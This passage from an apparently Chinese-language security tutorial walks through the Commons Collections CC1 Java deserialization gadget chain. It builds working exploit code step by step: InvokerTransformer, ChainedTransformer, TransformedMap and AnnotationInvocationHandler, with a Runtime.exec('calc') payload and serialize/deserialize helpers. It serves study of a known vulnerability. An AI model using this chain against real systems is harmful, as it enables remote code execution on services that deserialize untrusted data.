</li>
<li><p><code>org.apache.commons.collections.keyvalue</code> – 实现集合和键&#x2F;值映射相关的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.list</code> – 实现java.util.List接口的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.map</code> – 实现Map系列接口的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.set</code> – 实现Set系列接口的一组类</p>
</li>
</ul>
<h2 id="攻击链分析"><a href="#攻击链分析" class="headerlink" title="攻击链分析"></a>攻击链分析</h2><h3 id="寻找尾部"><a href="#寻找尾部" class="headerlink" title="寻找尾部"></a>寻找尾部</h3><p>通过<a href="https://github.com/frohoff/ysoserial">ysoserial</a>可以看到危险方法是<code>InvokerTransformer . transform()</code>方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521163436805.png" alt="image-20240521163436805"></p>
<p>我们试着用漏洞发现作者的视角来调试代码，作者首先找到了<code>Transformer</code>接口，接口有<code>transform()</code>方法。</p>
<p>有21个实现方法(包含了主角儿<code>InvokerTransformer</code>)，找到的<code>InvokerTransformer.transform()</code>方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521222016548.png" alt="image-20240521222016548"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521223049332.png" alt="image-20240521223049332"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;  <span class="hljs-comment">//接受一个对象</span><br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();  <span class="hljs-comment">//反射</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);  <br>            <span class="hljs-keyword">return</span> method.invoke(input, iArgs);     <span class="hljs-comment">//方法，参数类型，参数，都可控</span><br>                <br>        &#125;<br>    <br></code></pre></td></tr></table></figure>

<p>这就可以作为我们这条链的尾部。</p>
<p>尝试用这个方法去弹计算器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    <span class="hljs-comment">//普通弹计算器写法</span><br>    Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    <br>    <br>    <span class="hljs-comment">//反射写法</span><br>    <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>    Class&lt;Runtime&gt; c = Runtime.class;<br>    <span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>    exec.invoke(r, <span class="hljs-string">&quot;calc&quot;</span>);<br>    <br>    <span class="hljs-comment">//InvokerTransformer.transform写法</span><br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>为什么写<code> new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</code></p>
<p>首先，我们确认<code>InvokerTransformer.transform()</code>因为参数可控，可以调用任意方法。<code>transform()</code>需要传入的是一个对象,所以传入对象Runtime对象；</p>
<p>接下来看InvokerTransformer的构造方法，第一个参数，方法名（String类型），所以填入”exec”；</p>
<p>第二个参数，参数类型（Class数组），”exec”接受一个 <code>String</code> 类型所以填入new Class[]{String.class}；</p>
<p>第三个参数，参数值（Object数组），所以填入new Object[]{“calc”})；</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521225147161.png" alt="image-20240521225147161"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521225202458.png" alt="image-20240521225202458"></p>
<p>下一步的目标是去找调用 <code>transform()</code> 方法的不同类。</p>
<h3 id="寻找调用链"><a href="#寻找调用链" class="headerlink" title="寻找调用链"></a>寻找调用链</h3><p>按住alt+f7寻找哪些函数调用了，<code>transform()</code>方法,看到有21个调用<img src="https://image.sp4rks.xyz/2024/06/image-20240522210518321.png" alt="image-20240522210518321"></p>
<p>我们目标是找到一个不同名方法调用了<code>transform()</code>方法，相当与让调用链往前走一步，最终我们呢找到了<code>TransformdMap. checkSetValue()</code>调用了<code>transform()</code><img src="https://image.sp4rks.xyz/2024/06/image-20240522211955793.png" alt="image-20240522211955793"></p>
<p>单独把这几段代码放出来解释一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//TransformedMap继承了AbstractInputCheckedMapDecorator 并实现了 Serializable 接口</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformedMap</span>   <br>        <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractInputCheckedMapDecorator</span><br>        <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <br>	<span class="hljs-comment">//keyTransformer 和 valueTransformer 的类型是Transformer，这表明它们是对象，而不是基本数据类型或局部变量。</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">7023152376788900464L</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer keyTransformer;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer valueTransformer;  <br>    <br><br>	<span class="hljs-comment">//decorate 方法是一个静态工厂方法，接受一个Map和两个Transformer对象，返回一个经过转换的Map。</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br>    &#125; <br><br>	<span class="hljs-comment">// 构造函数接受一个Map和两个Transformer对象，并调用父类构造函数super(map)来初始化基类部分，同时初始化 	keyTransformer 和 valueTransformer 成员变量。</span><br>  	<span class="hljs-keyword">protected</span> <span class="hljs-title function_">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-built_in">this</span>.keyTransformer = keyTransformer;<br>        <span class="hljs-built_in">this</span>.valueTransformer = valueTransformer;<br>    &#125;   <br>    <br>	<span class="hljs-comment">//checkSetValue 方法用于在设置值时对值进行转换。它通过调用 valueTransformer 的 transform 方法将传入的值转换成目标值。</span><br>	<span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span> &#123;<br>        <span class="hljs-keyword">return</span> valueTransformer.transform(value);<br>    &#125;       <br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">我们看到返回了一个valueTransformer.transform(value),那valueTransformer是什么？(Ctrl+鼠标左键点击valueTransformer)到了构造函数，构造函数是一个protected,说明只能自己调用<br>    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;<br>        super(map);<br>        this.keyTransformer = keyTransformer;<br>        this.valueTransformer = valueTransformer;<br>    &#125;<br>最后看到decorate方法完成了装饰操作<br>      public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;<br>        return new TransformedMap(map, keyTransformer, valueTransformer);<br>    &#125; <br><br></code></pre></td></tr></table></figure>

<p>因为decorate是一个静态方法所以可以直接使用<code>TransformedMap.decorate</code>;</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523095834788.png" alt="image-20240523095834788"></p>
<p>接下来就找谁调用了<code>checkSetValue()</code>,发现就一个调用，<code>AbstractInputCheckedMapDecorator.MapEntry.setValue()</code>。是<code>TransformedMap</code>的父类，发现其实<code>AbstractInputCheckedMapDecorator.setValue()</code>是重写了Entry遍历的写法。那只要有一个类遍历Entry就可以走进<code>setValue</code>。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240522222342135.png" alt="image-20240522222342135"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        <br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <br>        map.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        <br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br>        <br>        <span class="hljs-keyword">for</span> (Map.Entry entry : transformedMap.entrySet()) &#123;<br>            entry.setValue(r);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以试着调试一些这段代码</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523000545804.png" alt="image-20240523000545804"></p>
<p>首先进入到<code>AbstractInputCheckedMapDecorator.MapEntry.setValue()</code>，parent为<code>TransformedMap</code>对象。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523090042519.png" alt="image-20240523090042519"></p>
<p>然后进入到<code>TransformedMap.checkSetValue</code>;vulueTransformer为<code>InvokerTransformer</code>对象</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523000632982.png" alt="image-20240523000632982"></p>
<p>然后进入了<code>InvokerTransformer.transform</code>;调用了<code>invoke()</code>方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523092438757.png" alt="image-20240523092438757"></p>
<p>捋捋调用链</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523102559433.png" alt="image-20240523102559433"></p>
<h3 id="链首"><a href="#链首" class="headerlink" title="链首"></a>链首</h3><p>上面已经证明了我们找的利用链有效，现在再往上级找，找谁调用了<code>setValue()</code>,最终找到了<code>AnnotationInvocationHandler.readObject()</code>调用了<code>setValue()</code>。所以就可以当链首。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523105916973.png" alt="image-20240523105916973"></p>
<h2 id="TransformMap版CC1"><a href="#TransformMap版CC1" class="headerlink" title="TransformMap版CC1"></a>TransformMap版CC1</h2><p>调用链</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523204418229.png" alt="image-20240523204418229"></p>
<p>因为<code>AnnotationInvocationHandler</code>不是public方法，所以只能通过反射创建</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523104354658.png" alt="image-20240523104354658"></p>
<p>反射写法没什么好说的。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523151140450.png" alt="image-20240523151140450"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><br>        <br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        <br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br><br>		<br>		<span class="hljs-comment">//反射获取AnnotationInvocationHandler</span><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Override.class, transformedMap);<br><br>        SER(o);<br>        UNSER(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SER</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">UNSER</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="三个问题"><a href="#三个问题" class="headerlink" title="三个问题"></a>三个问题</h3><ol>
<li><p>Runtime并不能序列化</p>
</li>
<li><p>这个循环体不知道是否能进去</p>
</li>
<li><p><code>AnnotationInvocationHandler.readObject() </code>for循环中是<code>new AnnotationTypeMismatchExceptionProxy</code>并不是我们想要的Runtime类</p>
</li>
</ol>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523152522150.png" alt="image-20240523152522150"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523151954472.png" alt="image-20240523151954472"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523151920747.png" alt="image-20240523151920747"></p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>解决问题一：虽然Runtime不可以序列化，但是Runtime.class可以</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//通过反射获取Runtime对象</span><br>Class&lt;Runtime&gt; c = Runtime.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">execMethod</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        execMethod.invoke(r, <span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">     <span class="hljs-comment">//根据InvokerTransformer().transform()编写，相当于用这一串代码，实现上面的代码</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> (Method) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;).transform(Runtime.class);<br><br>      <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;).transform(getRuntimeMethod);<br><br>      <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br><br></code></pre></td></tr></table></figure>

<p>解决问题二：</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523192532159.png" alt="image-20240523192532159"> </p>
<p>分析一下这段代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>        s.defaultReadObject();<br><br>        <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            annotationType = AnnotationType.getInstance(type);  <span class="hljs-comment">//这里的type就是我们刚刚传入的Override.class</span><br>        &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>            <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br><br>        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>        <br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();     <span class="hljs-comment">//获取成员方法，也就是获取Override的成员方法</span><br>            Class&lt;?&gt; memberType = memberTypes.get(name); <span class="hljs-comment">//查找成员方法</span><br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  	<span class="hljs-comment">//但是Override并没有值，所以根本走不到下面的判断，也就调用不了setValue()</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>


<p>改写自己的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-comment">//        Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class);</span><br><span class="hljs-comment">//        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getRuntimeMethod);</span><br><span class="hljs-comment">//        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br><span class="hljs-comment">//这段的代码可以通过ChainedTransformer链式调用改写。</span><br>        <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-comment">//key改为Target的成员方法</span><br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object,Object&gt; transformerMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br>		<br>        <br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//这里改为Target.class</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class, transformerMap );<br><br>        SER(o);<br>        UNSER(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SER</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">UNSER</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解决问题三：</p>
<p><code>ConstantTransformer.transform</code>相当于传入什么就返回什么，这就很方便我们了，我们可以传入(Runtime.class)</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523194708176.png" alt="image-20240523194708176"></p>
<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object,Object&gt; transformerMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> 